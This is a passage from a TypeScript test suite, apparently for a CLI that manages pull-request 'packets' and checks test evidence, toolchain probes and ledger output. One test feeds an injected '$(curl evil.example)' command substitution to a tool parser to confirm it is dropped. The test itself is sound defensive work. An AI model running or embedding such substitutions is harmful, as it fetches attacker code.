    true,
  );

  // Once the abandoned PR is actually closed on GitHub, there is nothing left to flag.
  const nowClosed = packetDivergences(parked, {
    state: "closed",
    merged: false,
    draft: submitted.prMeta?.draft ?? true,
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.deepEqual(nowClosed, []);
});

test("the reject warning reaches the operator's terminal, not only the ledger", () => {
  // The reducer-level assertions above all passed while the CLI printed nothing but `rejected <id>`
  // — the exact silence issue #34 opens with. This drives the real binary and reads its streams.
  const dir = mkdtempSync(join(tmpdir(), "foundry-cli-"));
  // `--state` is what isolates this, not `cwd`. The ledger path is anchored to the repo root
  // (factory/cli.ts), so a bare spawn would read and rewrite the developer's real state file.
  const statePath = join(dir, ".foundry-state.json");
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  assert.ok(submitted.prUrl);
  writeFileSync(statePath, JSON.stringify(state));

  const cli = join(import.meta.dirname, "cli.ts");
  const reject = (id: string) =>
    spawnSync(
      process.execPath,
      [
        "--experimental-strip-types",
        cli,
        "reject",
        id,
        "--reason",
        "typo, meant a different id",
        "--state",
        statePath,
      ],
      { cwd: dir, encoding: "utf8" },
    );

  const loud = reject(submitted.id);
  // Reject is the documented halt-everything path: it still succeeds and still exits 0.
  assert.equal(loud.status, 0, `${loud.stdout}${loud.stderr}`);
  assert.match(loud.stdout, new RegExp(`rejected ${submitted.id}`));
  const seen = `${loud.stdout}${loud.stderr}`;
  assert.ok(seen.includes(submitted.prUrl!), seen);
  assert.match(seen, /still open on GitHub/);
  assert.match(seen, /close it by hand/);

  // ...and it is a warning, not boilerplate: a packet with no live PR rejects quietly.
  const quiet = reject(state.packets.find((p) => !p.prUrl)!.id);
  assert.equal(quiet.status, 0, `${quiet.stdout}${quiet.stderr}`);
  assert.doesNotMatch(`${quiet.stdout}${quiet.stderr}`, /still open on GitHub/);
});

test("the reject warning is scoped to submitted, not to every packet that names a PR", () => {
  // The `prUrl` half of the condition is pinned both ways by the test above; this pins the `status`
  // half, which was one-directional — widening `status === "submitted" && prUrl` to `prUrl` alone
  // left the suite green. A `followed-up` packet still names a live PR, but it has already released
  // the slot, so rejecting it is not the halt-everything path abandoning an in-flight draft.
  // (`reconcile` still flags the open PR afterward via `packetDivergences` — that is unchanged.)
  const seed = seedState();
  const submitted = seed.packets.find((p) => p.status === "submitted")!;
  const released = applyPrSync(seed, submitted.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-09-20T00:00:00.000Z",
  });
  const followedUp = released.state.packets.find((p) => p.id === submitted.id)!;
  assert.equal(followedUp.status, "followed-up");
  assert.ok(followedUp.prUrl, "the followed-up packet must still name a PR or this binds nothing");

  const result = applyReject(released.state, submitted.id, "superseded upstream");
  assert.equal(result.error, undefined);
  assert.equal(result.warning, undefined);
  const after = result.state.packets.find((p) => p.id === submitted.id)!;
  assert.equal(after.status, "rejected");
  // Nothing leaked into the stored record either: the park reason is the operator's reason, verbatim.
  assert.equal(after.parkReason, "superseded upstream");
  assert.equal(result.state.events[0].message, "superseded upstream");
});

test("status does not claim a re-block that the held slot already prevented", () => {
  // Driven at the reducer level, the reply-owed note was recorded and nothing surfaced it: `status`
  // printed "(maintainer activity re-blocks the tick)" for a packet whose maintainer activity had
  // just re-blocked nothing, and `reconcile` reported divergences=0. Drive the real binary.
  const dir = mkdtempSync(join(tmpdir(), "foundry-cli-status-"));
  // See the reject test above: `--state` is the isolation, since the default path is the repo root.
  const statePath = join(dir, ".foundry-state.json");
  const cli = join(import.meta.dirname, "cli.ts");
  const statusIn = (state: FactoryState) => {
    writeFileSync(statePath, JSON.stringify(state));
    const run = spawnSync(
      process.execPath,
      ["--experimental-strip-types", cli, "status", "--state", statePath],
      { cwd: dir, encoding: "utf8" },
    );
    assert.equal(run.status, 0, `${run.stdout}${run.stderr}`);
    return `${run.stdout}${run.stderr}`;
  };

  const seed = seedState();
  const a = seed.packets.find((p) => p.status === "submitted")!;
  const released = applyPrSync(seed, a.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-09-20T00:00:00.000Z",
  });

  // Control: slot free, nothing owed — the original claim is true, and still printed.
  const free = statusIn(released.state);
  assert.match(free, /\(maintainer activity re-blocks the tick\)/);
  assert.doesNotMatch(free, /reply owed:/);

  // Now B takes the freed slot and maintainer activity lands on A.
  const b = buildPacket({
    repoId: "github/awesome-copilot",
    issueNumber: 2684,
    issueTitle: "operator ticked this while A was quiet",
    issueUrl: "https://github.com/github/awesome-copilot/issues/2684",
  });
  const withB: FactoryState = {
    ...released.state,
    packets: [{ ...b, status: "gated", station: "freeze" }, ...released.state.packets],
  };
  const woken = applyPrSync(withB, a.id, prMetaAt("2026-09-21T08:00:00.000Z", { issueComments: 2 }), {
    threadsAnswered: false,
    at: "2026-09-21T09:00:00.000Z",
  });
  assert.equal(woken.state.packets.find((p) => p.id === a.id)?.status, "followed-up");

  const held = statusIn(woken.state);
  // The false claim is gone...
  assert.doesNotMatch(held, /\(maintainer activity re-blocks the tick\)/);
  assert.match(held, /does not re-block the tick/);
  // ...and the reply the operator now owes is named, with the PR to answer.
  assert.match(held, /reply owed:/);
  assert.ok(held.includes(a.prUrl!), held);
});

function fakeRunner(script: Record<string, { exit: number; output: string }>) {
  const calls: string[] = [];
  /** Parallel to `calls`: the working directory each step was handed, so cwd is assertable too. */
  const cwds: (string | undefined)[] = [];
  const runner = async (cmd: string, args: string[], opts?: { cwd?: string }) => {
    const line = [cmd, ...args].join(" ");
    calls.push(line);
    cwds.push(opts?.cwd);
    const hit = Object.entries(script).find(([prefix]) => line.includes(prefix));
    return hit ? hit[1] : { exit: 0, output: "" };
  };
  return { runner, calls, cwds };
}

test("host witness: green at head, red on revert, sha-bound logs", async () => {
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_orca-fleet_71",
      repoId: "ravidsrk/orca-fleet",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "python3 scripts/validate.py",
      sandbox: "host",
      wave: 0,
    },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (outcome.ok) {
    assert.equal(outcome.witness.provider, "host");
    assert.equal(outcome.witness.testExit, 0);
    assert.notEqual(outcome.witness.revertExit, 0);
    assert.match(outcome.witness.testLogSha, /^[0-9a-f]{64}$/);
    assert.match(outcome.witness.revertLogSha, /^[0-9a-f]{64}$/);
  }
});

test("host witness fails when the control stays green or tests are red at head", async () => {
  const greenRevert = await witnessEvidence(
    { packetId: "pkt_ravidsrk_orca-fleet_71", repoId: "ravidsrk/orca-fleet", baseSha: BASE, headSha: HEAD, testCommand: "true", sandbox: "host", wave: 0 },
    fakeRunner({ "run-tests@head": { exit: 0, output: "ok" }, "run-tests@revert": { exit: 0, output: "still ok" } }).runner,
    {},
  );
  assert.equal(greenRevert.ok, false);
  if (!greenRevert.ok) assert.match(greenRevert.error, /negative control/i);

  const redHead = await witnessEvidence(
    { packetId: "pkt_ravidsrk_orca-fleet_71", repoId: "ravidsrk/orca-fleet", baseSha: BASE, headSha: HEAD, testCommand: "true", sandbox: "host", wave: 0 },
    fakeRunner({ "run-tests@head": { exit: 2, output: "boom" } }).runner,
    {},
  );
  assert.equal(redHead.ok, false);
  if (!redHead.ok) assert.match(redHead.error, /red at head/i);
});

test("witness refuses instead of degrading: e2b without a key, host outside Wave 0", async () => {
  const noKey = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "e2b", wave: 1 },
    fakeRunner({}).runner,
    {},
  );
  assert.equal(noKey.ok, false);
  if (!noKey.ok) assert.match(noKey.error, /cannot witness evidence in dry-run/i);

  const hostWave1 = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "host", wave: 1 },
    fakeRunner({}).runner,
    {},
  );
  assert.equal(hostWave1.ok, false);
  if (!hostWave1.ok) assert.match(hostWave1.error, /Wave 0/);
});

const WAVE0 = {
  packetId: "pkt_ravidsrk_orca-fleet_71",
  repoId: "ravidsrk/orca-fleet",
  baseSha: BASE,
  headSha: HEAD,
  sandbox: "host" as const,
  wave: 0 as const,
};

/** 60 lines ending in the way a too-old interpreter actually dies, so the tail has to be a tail. */
function noisyRun(): string {
  const lines = Array.from({ length: 59 }, (_, i) => `line-${i + 1}`);
  lines.push("TypeError: unsupported operand type(s) for |: 'type' and 'NoneType'");
  return lines.join("\n");
}

/**
 * The two refusals an operator hits with a working patch and a broken machine (issue #41).
 *
 * Both used to end at the exit code. `tests are red at head d91fe2f (exit 1) — nothing to witness`
 * is the same sentence whether the patch is wrong or the interpreter is six minor versions too
 * old, and it never referenced `headRun.output` at all — so there was nothing to un-truncate, the
 * output simply was not there. A refusal that cannot be told apart from a different refusal is not
 * a diagnostic.
 */
/** The stock-macOS #41 machine, as the probe step sees it: `python3` is `/usr/bin/python3` 3.9.6. */
const STALE_PYTHON = {
  "probe command -v python3": { exit: 0, output: "/usr/bin/python3\nPython 3.9.6\n" },
};

test("a red-at-head refusal prints the command it ran and the tail of the run", async () => {
  const redHead = await witnessEvidence(
    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
    fakeRunner({ ...STALE_PYTHON, "run-tests@head": { exit: 1, output: noisyRun() } }).runner,
    {},
  );
  assert.equal(redHead.ok, false);
  if (!redHead.ok) {
    assert.match(redHead.error, /red at head/i);
    assert.match(redHead.error, /python3 scripts\/validate\.py/, "the resolved command is missing");
    // The fact that separates the two cases, and the reason this refusal exists at all. Every
    // refusal test used to script only the run phases, so `toolchain` was `undefined` in all of
    // them and `runFailureDetail`'s `if (toolchain)` branch was never taken: deleting the line
    // left the suite green. Here the machine is #41's — a working patch and a six-minor-versions
    // -too-old interpreter — and the refusal has to say which.
    assert.match(redHead.error, /^ {2}toolchain: python3 3\.9\.6$/m, redHead.error);
    assert.match(
      redHead.error,
      /unsupported operand type\(s\)/,
      `the failing output is missing: ${redHead.error}`,
    );
    // A tail, not a dump: 60 lines in, the first 20 stay out and the refusal says how many.
    assert.doesNotMatch(redHead.error, /line-1\b/, "the whole run was pasted instead of its tail");
    assert.match(redHead.error, /20 earlier lines omitted/, redHead.error);
    assert.match(redHead.error, /line-59/, redHead.error);
  }
});

test("a red-at-head refusal with no output at all says so, and points at the pre-flight", async () => {
  // The shape of #41 on a stock macOS machine: `python3` resolves to 3.9.6, the command dies
  // before it prints anything, and the operator gets three seconds and a blank refusal.
  const silent = await witnessEvidence(
    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
    fakeRunner({ ...STALE_PYTHON, "run-tests@head": { exit: 127, output: "" } }).runner,
    {},
  );
  assert.equal(silent.ok, false);
  if (!silent.ok) {
    assert.match(silent.error, /python3 scripts\/validate\.py/);
    // The no-output branch returns early, so it carries the toolchain on its own code path — and
    // this is the one refusal where the toolchain is the *only* evidence the operator gets.
    assert.match(silent.error, /^ {2}toolchain: python3 3\.9\.6$/m, silent.error);
    assert.match(silent.error, /no output/i, silent.error);
    // Pinned verbatim, the way INGEST_INVOCATION is: `page.includes(CONSTANT)` holds for whatever
    // the constant happens to say, so the assertion has to know the right answer. `cli.test.ts`
    // supplies the other half by driving that verb for real.
    const { PREFLIGHT_INVOCATION } = await import("./witness.ts");
    assert.equal(
      PREFLIGHT_INVOCATION,
      "node --experimental-strip-types factory/cli.ts witness-check",
    );
    assert.ok(silent.error.includes(PREFLIGHT_INVOCATION), silent.error);
  }
});

test("a failed negative control prints the revert run's output and the command", async () => {
  const stayedGreen = await witnessEvidence(
    { ...WAVE0, testCommand: "npm test" },
    fakeRunner({
      "probe command -v npm": { exit: 0, output: "/opt/homebrew/bin/npm\n10.9.2\n" },
      "run-tests@head": { exit: 0, output: "ok" },
      "run-tests@revert": { exit: 0, output: "100 passing, 0 failing" },
    }).runner,
    {},
  );
  assert.equal(stayedGreen.ok, false);
  if (!stayedGreen.ok) {
    assert.match(stayedGreen.error, /negative control/i);
    assert.match(stayedGreen.error, /npm test/, stayedGreen.error);
    // The third caller of `runFailureDetail`, passing the toolchain on its own line of code.
    assert.match(stayedGreen.error, /^ {2}toolchain: npm 10\.9\.2$/m, stayedGreen.error);
    assert.match(stayedGreen.error, /100 passing, 0 failing/, stayedGreen.error);
  }
});

test("a refusal names the toolchain when it knows one and stays silent when it does not", () => {
  // The conditional itself, both ways. Pinning only the present case licenses making the line
  // unconditional, which prints `toolchain: undefined` on exactly the machine where the probe
  // failed — a refusal inventing a fact about the very thing the operator is trying to diagnose.
  const known = runFailureDetail("python3 -m pytest", "E   ImportError", "python3 3.9.6");
  assert.match(known, /^ {2}toolchain: python3 3\.9\.6$/m, known);
  // Directly under the command, before the output: the two facts the operator reads together.
  assert.match(known, /^ {2}command: python3 -m pytest\n {2}toolchain: python3 3\.9\.6$/m, known);

  const unknown = runFailureDetail("python3 -m pytest", "E   ImportError");
  assert.doesNotMatch(unknown, /toolchain/i, unknown);
  assert.match(unknown, /^ {2}command: python3 -m pytest$/m, unknown);
});

test("the witness records the toolchain that produced the green, resolved inside the clone", async () => {
  const { runner, calls, cwds } = fakeRunner({
    "probe command -v python3": { exit: 0, output: "/opt/homebrew/bin/python3\nPython 3.14.7\n" },
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    { ...WAVE0, testCommand: "python3 scripts/validate.py && python3 -m unittest discover" },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (outcome.ok) assert.equal(outcome.witness.toolchain, "python3 3.14.7");

  // Resolved in the checkout, not in the operator's home: a repo that pins its interpreter
  // (`.python-version`, `.tool-versions`, `.nvmrc`) must be recorded by what *it* selects.
  const probeIdx = calls.findIndex((c) => c.startsWith("probe "));
  assert.ok(probeIdx !== -1, calls.join("\n"));
  assert.match(cwds[probeIdx] ?? "", /foundry-witness-/, `probed in ${cwds[probeIdx]}`);
});

test("a witness whose toolchain could not be resolved claims none", async () => {
  // The alternative — recording `python3 (not found)` — puts a sentence on the evidence page that
  // reads as a fact about the run. Absence is the honest record.
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence({ ...WAVE0, testCommand: "python3 -m pytest" }, runner, {});
  assert.equal(outcome.ok, true);
  if (outcome.ok) assert.equal(outcome.witness.toolchain, undefined);
});

test("the toolchain probe names one tool per command segment, and only plausible ones", () => {
  assert.deepEqual(
    commandTools("python3 scripts/validate.py && python3 -m unittest discover -s tests -v"),
    ["python3"],
  );
  assert.deepEqual(commandTools("npm ci && npm test"), ["npm"]);
  assert.deepEqual(commandTools("pytest -q | tee out.txt; ruff check ."), ["pytest", "tee", "ruff"]);
  assert.deepEqual(commandTools("FOO=1 python3 -c 'x'"), ["python3"], "env assignments are not tools");
  assert.deepEqual(commandTools("true"), ["true"]);
  // The probe interpolates the token into a shell command, so anything that is not a bare command
  // name is dropped rather than resolved. `testCommand` is already operator-controlled and run
  // verbatim, so this is not a new trust boundary — it is a refusal to invent a second one.
  assert.deepEqual(commandTools("$(curl evil.example) --run"), []);
  assert.deepEqual(commandTools("./scripts/ci.sh && make -j4"), ["./scripts/ci.sh", "make"]);
});

test("the toolchain label states versions and stays silent about what it could not resolve", () => {
  assert.equal(
    toolchainLabel([{ tool: "python3", path: "/opt/homebrew/bin/python3", version: "3.14.7", raw: "Python 3.14.7" }]),
    "python3 3.14.7",
  );
  assert.equal(
    toolchainLabel([
      { tool: "npm", path: "/x/npm", version: "10.9.2", raw: "10.9.2" },
      { tool: "node", path: "/x/node", version: "24.11.0", raw: "v24.11.0" },
    ]),
    "npm 10.9.2, node 24.11.0",
  );
  assert.equal(toolchainLabel([{ tool: "python3" }]), "");
  assert.equal(toolchainLabel([]), "");
});

test("draft-ready requires a witnessed manifest, not an attested one", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  const packet = state.packets[0];
  const unwitnessed = {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert" as const,
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  };
  state = applyAttachEvidence(state, id, unwitnessed, bindingFor(packet)).state;
  const blocked = applyAdvance(state, id);
  assert.match(blocked.error ?? "", /witness/i);

  let state2 = applyTick(blank()).state;
  state2 = applyApprove(state2, id, "attest").state;
  state2 = applyAdvance(state2, id).state;
  state2 = applyAdvance(state2, id).state;
  const witnessedManifest = {
    ...unwitnessed,
    witness: {
      provider: "host" as const,
      testExit: 0,
      revertExit: 1,
      testLogSha: "a".repeat(64),
      revertLogSha: "b".repeat(64),
      ranAt: "2026-08-28T16:00:00.000Z",
      repoId: state2.packets[0].repoId,
      baseSha: BASE,
      headSha: HEAD,
      testLogPath: `docs/evidence/logs/${id}/test.log`,
      revertLogPath: `docs/evidence/logs/${id}/revert.log`,
    },
  };
  state2 = applyAttachEvidence(state2, id, witnessedManifest, bindingFor(state2.packets[0])).state;
  const advanced = applyAdvance(state2, id);
  assert.equal(advanced.error, undefined);
  assert.equal(state2.packets[0].evidence?.witness?.provider, "host");
});

test("the named awesome-copilot first issue is scoutable, not invented", () => {
  const seed = seedState();
  const quiet = {
    ...seed,
    packets: seed.packets.map((p) =>
      p.status === "submitted" ? { ...p, status: "followed-up" as const } : p,
    ),
  };
  const ticked = applyTick(quiet);
  assert.ok(ticked.packet);
  assert.equal(ticked.packet?.repoId, "github/awesome-copilot");
  assert.equal(ticked.packet?.issueNumber, 2684);
  assert.equal(ticked.packet?.policy.code, "ALLOW");
  assert.equal(ticked.packet?.policy.record?.stance, "welcome");
});

test("the evidence page binds every claim to a checkable source", () => {
  const seed = seedState();
  const merged = seed.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_71")!;
  const page = renderEvidencePage(merged);
  assert.match(page, /Attested by \*\*operator\*\*/);
  assert.match(page, /Test command/);
  assert.match(page, new RegExp(merged.evidence!.baseSha.slice(0, 12)));
  assert.match(page, /attested, not witnessed/);
  assert.equal(page.includes(DISCLOSURE), true);
  assert.match(page, /you own the merge/);
});

test("the committed evidence page regenerates byte-identical from this tree", () => {
  const seed = seedState();
  const merged = seed.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_71")!;
  const committed = readFileSync(
    new URL("../docs/evidence/pkt_ravidsrk_orca-fleet_71.md", import.meta.url),
    "utf8",
  );
  assert.equal(committed.trimEnd(), renderEvidencePage(merged).trimEnd());
  assert.equal(committed.includes(DISCLOSURE), true);
});

/**
 * Drives the real binary against a ledger these fixtures own. It delegates to the one `runCli`
 * helper (declared below and hoisted), which is what supplies `--state`: the ledger path is
 * anchored to the repo root, so a spawned CLI left to its default reads the developer's real state
 * file no matter which temp directory it was started in — and this helper's earlier form passed the
 * state by `cwd` alone, which meant every assertion below was silently made against the seed.
 */
function runCliWithState(args: string[], state: FactoryState) {
  const dir = mkdtempSync(join(tmpdir(), "foundry-cli-ledger-"));
  writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));
  const run = runCli(dir, args);
  return { ...run, out: run.seen, dir };
}

/**
 * `ledgerSections` is unit-tested in `status.test.ts`, but the divergence issue #44 item 9 describes
 * — `status` says `packets=6` while `ledger` prints 5, the missing one being the denied
 * `matplotlib/matplotlib` scout — lives in the `ledger` *command*, which did its own wave filter.
 * Re-adding a `wave < 99` filter there restores the divergence with every helper test still green,
 * so the count agreement has to be asserted across the two shipped commands.
 */
test("the ledger command lists every packet status counts, denials included", () => {
  const seed = seedState();
  const status = runCliWithState(["status"], seed);
  assert.equal(status.status, 0, status.out);
  const counted = Number(/packets=(\d+)/.exec(status.stdout)?.[1]);
  assert.equal(counted, seed.packets.length);
  assert.ok(counted > 0);

  const ledger = runCliWithState(["ledger"], seed);
  assert.equal(ledger.status, 0, ledger.out);
  const rows = ledger.stdout.split("\n").filter((l) => l.startsWith("| pkt_"));
  assert.equal(rows.length, counted, `status counted ${counted}, ledger listed ${rows.length}`);

  // Not just the count: the packet the old filter dropped is the refusal the audit surface exists
  // to show, and it must appear under a heading that says what it is.
  assert.match(ledger.stdout, /### Off allowlist — denied or unlisted/);
  assert.match(ledger.stdout, /\| pkt_matplotlib_matplotlib_0 \|/);
  for (const p of seed.packets) assert.ok(ledger.stdout.includes(`| ${p.id} |`), `${p.id} is missing`);
});

/**
 * The committed block in `docs/12-ledger.md` is generated, and its header says so — but nothing
 * checked it, so deleting the off-allowlist section the fix added left the suite green and the
 * audit surface silently short one denial again. Same guard the evidence page already has
 * (issue #44 item 9).
 */
test("the committed ledger GENERATED block regenerates byte-identical from this tree", () => {
  const doc = readFileSync(new URL("../docs/12-ledger.md", import.meta.url), "utf8");
  const block = /<!-- GENERATED:[^\n]*-->\n([\s\S]*?)<!-- \/GENERATED -->/.exec(doc);
  assert.ok(block, "the GENERATED markers must exist or nothing is being guarded");
  const ledger = runCliWithState(["ledger"], seedState());
  assert.equal(ledger.status, 0, ledger.out);
  assert.equal(block[1], ledger.stdout);
  // The two halves of the guard: the block is generated, and it is not empty boilerplate.
  assert.match(block[1], /### Off allowlist — denied or unlisted/);
  assert.match(block[1], /pkt_matplotlib_matplotlib_0/);
  // ...and the refusal row does not render its `#0` placeholder as an issue number. This repo's
  // doctrine is that the clock never invents issue numbers, and a `matplotlib/matplotlib#0` link
  // label reads like one to anyone auditing the ledger.
  assert.doesNotMatch(block[1], /matplotlib\/matplotlib#0/);
  assert.match(block[1], /\| pkt_matplotlib_matplotlib_0 \| — \|/);
});

/**
 * `quietLabel` is unit-tested, but the operator only ever sees it through `status`. Reverting
 * `cli.ts` to interpolate a bare `quiet=0d/14` leaves every `status.test.ts` assertion green while
 * the terminal goes back to reading like a live look at the PR (issue #44 item 11).
 */
test("status names the observation its quiet counter was extrapolated from", () => {
  const seed = seedState();
  const inflight = seed.packets.find((p) => INFLIGHT_STATUSES.includes(p.status) && p.prMeta)!;
  assert.ok(inflight, "the seed must hold an in-flight packet carrying prMeta");
  const status = runCliWithState(["status"], seed);
  assert.equal(status.status, 0, status.out);

  const line = status.stdout.split("\n").find((l) => l.includes(inflight.id))!;
  assert.ok(line, status.stdout);
  assert.match(line, /quiet=\d+d\/14/);
  assert.match(line, /PR last active \d{4}-\d{2}-\d{2}/);
  assert.match(line, /read by `sync` \d{4}-\d{2}-\d{2}/);
  assert.match(line, /`sync` to refresh/);
  assert.ok(line.includes(inflight.prMeta!.syncedAt.slice(0, 10)), line);
  assert.ok(line.includes(inflight.prMeta!.updatedAt.slice(0, 10)), line);
});

/**
 * The shipped verb, not the reducer. `cli.ts halt` printed the operator's own argument back and
 * exited 0 while the scorecard row it named kept `tone=neutral health=good` and the packet stayed
 * in flight — a silent fail-open on the one command docs/PRODUCT.md:47 promises within the hour
 * (issue #44 item 10).
 */
test("the halt command, typed in GitHub's casing, actually halts", () => {
  const seed = seedState();
  const dir = mkdtempSync(join(tmpdir(), "foundry-cli-halt-"));
  const statePath = join(dir, ".foundry-state.json");
  writeFileSync(statePath, JSON.stringify(seed));
  const cli = join(import.meta.dirname, "cli.ts");
  // The ledger is repo-anchored, so a spawned CLI must be pointed at the temp copy explicitly or it
  // would read — and mutate — the real repo-root state file.
  const at = (args: string[]) =>
    spawnSync(process.execPath, ["--experimental-strip-types", cli, ...args, "--state", statePath], {
      cwd: dir,
      encoding: "utf8",
    });

  const halt = at(["halt", "colemurray/background-agents", "--reason", "maintainer asked us to stop"]);
  assert.equal(halt.status, 0, `${halt.stdout}${halt.stderr}`);
  // It reports the roster's spelling — the row it moved, not the argument it was given.
  assert.match(halt.stdout, /halted ColeMurray\/background-agents \(scorecard banned\)/);

  const after = at(["status"]);
  assert.equal(after.status, 0, `${after.stdout}${after.stderr}`);
  const row = after.stdout.split("\n").find((l) => l.includes("ColeMurray/background-agents  opened="))!;
  assert.ok(row, after.stdout);
  assert.match(row, /tone=banned/);
  assert.match(row, /health=stop/);
  assert.match(after.stdout, /bans=1/);
  assert.match(after.stdout, /in flight: none/);

  // And the fail-closed half survives: a repo the roster does not know is still refused, loudly.
  const stranger = at(["halt", "attacker/background-agents", "--reason", "x"]);
  assert.equal(stranger.status, 1, `${stranger.stdout}${stranger.stderr}`);
  assert.match(stranger.stderr, /attacker\/background-agents is not on the allowlist/);
});

test("test-path classifier knows suffix conventions and setup runs before tests", async () => {
  assert.equal(isTestPath("handler_test.go"), true);
  assert.equal(isTestPath("pkg/server/server_test.go"), true);
  assert.equal(isTestPath("foo_test.py"), true);
  assert.equal(isTestPath("foo_spec.rb"), true);
  assert.equal(isTestPath("src/contest.ts"), false);
  assert.equal(isTestPath("src/protest/handler.ts"), false);
  assert.equal(isTestPath("attestation.ts"), false);

  const calls: string[] = [];
  const runner = async (step: string, args: string[]) => {
    calls.push([step, ...args].join(" "));
    if (step === "run-tests@head") return { exit: 0, output: "ok" };
    if (step === "run-tests@revert") return { exit: 1, output: "red" };
    return { exit: 0, output: "" };
  };
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_frontguard_195",
      repoId: "ravidsrk/frontguard",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "npm test",
      setupCommand: "npm ci",
      sandbox: "host",
      wave: 0,
    },
    runner as never,
    {},
  );
  assert.equal(outcome.ok, true);
  const setupIdxs = calls.flatMap((c, i) => (c.startsWith("run-setup npm ci") ? [i] : []));
  const headIdx = calls.findIndex((c) => c.startsWith("run-tests@head"));
  const cleanIdx = calls.findIndex((c) => c.includes("clean -fdx"));
  const revertIdx = calls.findIndex((c) => c.startsWith("run-tests@revert"));
  assert.equal(setupIdxs.length, 2);
  assert.ok(headIdx !== -1 && cleanIdx !== -1 && revertIdx !== -1);
  assert.ok(setupIdxs[0] < headIdx && headIdx < cleanIdx && cleanIdx < setupIdxs[1] && setupIdxs[1] < revertIdx);

  const noSetup = await witnessEvidence(
    { packetId: "pkt_ravidsrk_orca-fleet_71", repoId: "ravidsrk/orca-fleet", baseSha: BASE, headSha: HEAD, testCommand: "true", sandbox: "host", wave: 0 },
    runner as never,
    {},
  );
  assert.equal(noSetup.ok, true);
});

test("a shape-valid witness with a green revert cannot pass the engine gate", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  const packet = state.packets[0];
  state = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
    witness: {
      provider: "host",
      testExit: 0,
      revertExit: 0,
      testLogSha: "e".repeat(64),
      revertLogSha: "f".repeat(64),
      ranAt: "2026-08-28T18:00:00.000Z",
      repoId: packet.repoId,
      baseSha: BASE,
      headSha: HEAD,
      testLogPath: `docs/evidence/logs/${id}/test.log`,
      revertLogPath: `docs/evidence/logs/${id}/revert.log`,
    },
  }, bindingFor(packet)).state;
  const blocked = applyAdvance(state, id);
  assert.match(blocked.error ?? "", /witnessed/);
});

test("a daytona witness loads, is refused at the gate on today's allowlist, and the executor names the right provider", async () => {
  const seed = seedState();
  const packet = { ...seed.packets[0] };
  packet.evidence = {
    ...packet.evidence!,
    witness: {
      provider: "daytona",
      testExit: 0,
      revertExit: 1,
      testLogSha: "a".repeat(64),
      revertLogSha: "b".repeat(64),
      ranAt: "2026-08-28T18:00:00.000Z",
      repoId: packet.repoId,
      baseSha: packet.evidence!.baseSha,
      headSha: packet.evidence!.headSha,
      testLogPath: `docs/evidence/logs/${packet.id}/test.log`,
      revertLogPath: `docs/evidence/logs/${packet.id}/revert.log`,
    },
  };
  const path = join(mkdtempSync(join(tmpdir(), "foundry-")), "daytona.json");
  writeFileSync(path, JSON.stringify({ ...seed, packets: [packet, ...seed.packets.slice(1)] }));
  const loaded = loadFactoryState(path);
  assert.equal(loaded.ok, true);

  const noKey = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "daytona", wave: 1 },
    (async () => ({ exit: 0, output: "" })) as never,
    {},
  );
  assert.equal(noKey.ok, false);
  if (!noKey.ok) assert.match(noKey.error, /dry-run/i);

  const daytonaNamed = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "daytona", wave: 1 },
    (async () => ({ exit: 0, output: "" })) as never,
    { E2B_API_KEY: "present" },
  );
  assert.equal(daytonaNamed.ok, false);
  if (!daytonaNamed.ok) assert.match(daytonaNamed.error, /Daytona execution/);

  const e2bNamed = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "e2b", wave: 1 },
    (async () => ({ exit: 0, output: "" })) as never,
    { E2B_API_KEY: "present" },
  );
  assert.equal(e2bNamed.ok, false);
  if (!e2bNamed.ok) assert.match(e2bNamed.error, /E2B execution/);

  // The half the old version of this test never touched: it asserted a daytona witness *loads*,
  // which says nothing, because loading is shape validation. ADR 0003 permits Daytona at Wave 1+,
